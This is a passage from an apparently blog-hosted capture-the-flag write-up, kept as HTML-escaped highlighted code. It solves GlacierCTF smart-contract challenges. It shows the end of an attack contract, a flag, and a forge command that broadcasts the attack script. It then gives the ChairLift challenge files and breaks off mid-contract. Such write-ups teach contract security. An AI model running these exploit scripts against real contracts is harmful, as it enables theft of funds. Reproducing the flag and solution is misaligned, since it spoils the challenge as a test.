&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;putToSleep&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; gctf{h3&amp;#39;s_sl33pIng_BuT_ju5t_4_n0w}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Run the following command to solve the challenge&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;forge&lt;&#x2F;span&gt;&lt;span&gt; script script&#x2F;GlacierVaultAttack.sol:AttackScript&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;RPC-URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;chairlift-397pts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chairlift-397pts&quot; aria-label=&quot;Anchor link for: chairlift-397pts&quot;&gt;ChairLift [397pts]&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;Description : 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;After you have defeated the monkeys you see a chairlift that will take you to the summit cross, this is your final step to reach the peak.&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;author: J4X
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc chall.glacierctf.com 13381
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [Setup.sol, ChairLift.sol, Ticket.sol]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Setup.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;ChairLift.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Setup {
&lt;&#x2F;span&gt;&lt;span&gt;    ChairLift public immutable TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Contract the player will hack
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Deploy the victim contract
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ChairLift&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Check if buying a ticket works
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;buyTicket&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Check if taking a ride works
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;takeRide&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Our challenge in the CTF framework will call this function to
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; check whether the player has solved the challenge or not.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;tripsTaken&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;ChairLift.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;Ticket.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ChairLift
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public tripsTaken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    Ticket public ticket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor &lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        ticket &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Ticket&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Chairlift Ticket&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;To get a ride you have to buy a ticket first
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;buyTicket&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external payable
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;owner)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require &lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100_000 &lt;&#x2F;span&gt;&lt;span&gt;ether&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket costs 100,000 ether, inflation has been hitting us hard too&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        ticket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mint&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;USing your ticket you can take a ride on the chairlift
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;takeRide&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 ticketId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require &lt;&#x2F;span&gt;&lt;span&gt;(ticket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ownerOf&lt;&#x2F;span&gt;&lt;span&gt;(ticketId) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You don&amp;#39;t own this ticket&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        tripsTaken &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        ticket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;burn&lt;&#x2F;span&gt;&lt;span&gt;(ticketId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Ticket.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Ticket {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private constant DOMAIN_SEPARATOR_TYPEHASH &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private constant PERMIT_TYPEHASH &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Permit(address from,address to,uint256 tokenId,uint256 nonce,uint256 deadline)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint256) public nonces&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;address) private _owners&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;address) private _tokenApprovals&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;bool)) private _operatorApprovals&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    string private _name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 id&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Transfer&lt;&#x2F;span&gt;&lt;span&gt;(address indexed from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address indexed to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256 indexed tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    event &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Approval&lt;&#x2F;span&gt;&lt;span&gt;(address indexed _owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address indexed approved&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256 indexed tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    event &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ApprovalForAll&lt;&#x2F;span&gt;&lt;span&gt;(address indexed _owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address indexed operator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bool approved)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(string memory name_) {
&lt;&#x2F;span&gt;&lt;span&gt;        _name &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;name_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        id &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;------------------------------------------------ PUBLIC FUNCTIONS ------------------------------------------------&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ownerOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;_owners[tokenId]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address ticketOwner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ownerOf&lt;&#x2F;span&gt;&lt;span&gt;(tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
